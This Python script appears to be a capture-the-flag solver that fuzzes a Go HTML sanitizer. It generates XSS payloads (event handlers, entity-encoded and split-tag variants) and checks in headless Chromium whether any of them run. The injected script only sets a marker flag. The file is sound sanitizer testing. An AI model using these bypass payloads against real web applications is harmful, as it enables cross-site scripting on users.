#!/usr/bin/env python3
import base64
import itertools
import re
import subprocess
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent
APP = ROOT / "web_&lt;_w+" / "app"
SANBIN = ROOT / "sanitize_cli"
MARK = "xsshit"
JS = f"globalThis.{MARK}=1"


def build_sanitizer():
    if SANBIN.exists():
        return
    subprocess.check_call(
        ["go", "build", "-o", str(SANBIN), str(ROOT / "sanitize_cli.go")],
        cwd=APP,
    )


def sanitize_batch(payloads):
    proc = subprocess.Popen(
        [str(SANBIN)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        text=True,
    )
    data = "\n".join(base64.b64encode(p.encode()).decode() for p in payloads) + "\n"
    out, _ = proc.communicate(data)
    results = []
    for line in out.splitlines():
        status, b64 = line.split("\t", 1)
        text = base64.b64decode(b64).decode("utf-8", "replace")
        results.append((status, text))
    return results


def chrome_runs(outputs):
    html = ["<!doctype html><meta charset=utf-8>"]
    for i, out in enumerate(outputs):
        html.append(f"<iframe id=f{i} sandbox='allow-scripts allow-same-origin'></iframe>")
        quoted = out.replace("\\", "\\\\").replace("`", "\\`").replace("</script", "<\\/script")
        html.append(
            f"<script>document.getElementById('f{i}').srcdoc=`{quoted}`;</script>"
        )
    html.append(
        "<script>setTimeout(()=>{"
        "for (let i=0;i<document.querySelectorAll('iframe').length;i++){"
        f"try{{if(frames[i].{MARK})"
        "document.body.append(' HIT:'+i)}}catch(e){}"
        "}},700)</script>"
    )
    page = "".join(html)
    with tempfile.NamedTemporaryFile("w", suffix=".html", delete=False) as f:
        f.write(page)
        path = f.name
    try:
        dom = subprocess.check_output(
            [
                "chromium",
                "--headless=new",
                "--no-sandbox",
                "--disable-gpu",
                "--dump-dom",
                "--virtual-time-budget=1500",
                "file://" + path,
            ],
            stderr=subprocess.DEVNULL,
            text=True,
        )
    finally:
        Path(path).unlink(missing_ok=True)
    tail = dom.split("</script>", 1)[-1]
    return [int(x) for x in re.findall(r"HIT:(\d+)", tail)], dom


def gen_payloads():
    sinks = [
        f"<script>{JS}</script>",
        f"<img src=x onerror=\"{JS}\">",
        f"<svg onload=\"{JS}\">",
        f"<body onload=\"{JS}\">",
        f"<details open ontoggle=\"{JS}\">",
        f"<iframe srcdoc=\"<script>{JS}</script>\">",
    ]
    enc = lambda s: s.replace("<", "&lt;").replace(">", "&gt;")
    wrappers = [
        "{x}",
        "&lt;{x}&gt;",
        "<ı a=\"{x}\">",
        "&lt;ı a=\"{x}\"&gt;",
        "<!{x}>",
        "&lt;!{x}&gt;",
        "<--{x}>",
        "&lt;--{x}&gt;",
        "<<{x}>",
        "&lt;&lt;{x}&gt;",
        "<x {x}>",
        "&lt;x {x}&gt;",
        "<svg><desc>{x}</desc></svg>",
        "&lt;svg&gt;&lt;desc&gt;{x}&lt;/desc&gt;&lt;/svg&gt;",
    ]
    atoms = []
    for s in sinks:
        atoms.extend([s, enc(s), s.replace("<", "&#60;").replace(">", "&#62;")])
    for x in atoms:
        yield x
        for w in wrappers:
            y = w.format(x=x)
            if len(y.encode()) <= 128:
                yield y
    # Split-tag attempts where regex deletion might join adjacent text.
    names = ["script", "img", "svg", "iframe", "details"]
    for name in names:
        for cut in range(1, len(name)):
            left, right = name[:cut], name[cut:]
            parts = [
                f"&lt;{left}&lt;z&gt;{right}&gt;{JS}&lt;/{name}&gt;",
                f"&lt;{left}&lt;/z&gt;{right}&gt;{JS}&lt;/{name}&gt;",
                f"&lt;{left}&lt;!x&gt;{right}&gt;{JS}&lt;/{name}&gt;",
            ]
            for p in parts:
                if len(p.encode()) <= 128:
                    yield p


def main():
    build_sanitizer()
    seen = []
    for p in gen_payloads():
        if p not in seen:
            seen.append(p)
    print(f"payloads={len(seen)}")
    for base in range(0, len(seen), 20):
        batch = seen[base : base + 20]
        san = sanitize_batch(batch)
        outputs = [o for status, o in san if status == "OK"]
        hits, dom = chrome_runs(outputs)
        if hits:
            for h in hits:
                print("HIT_INPUT", batch[h])
                print("HIT_OUTPUT", outputs[h])
            return
    print("no hit")


if __name__ == "__main__":
    main()
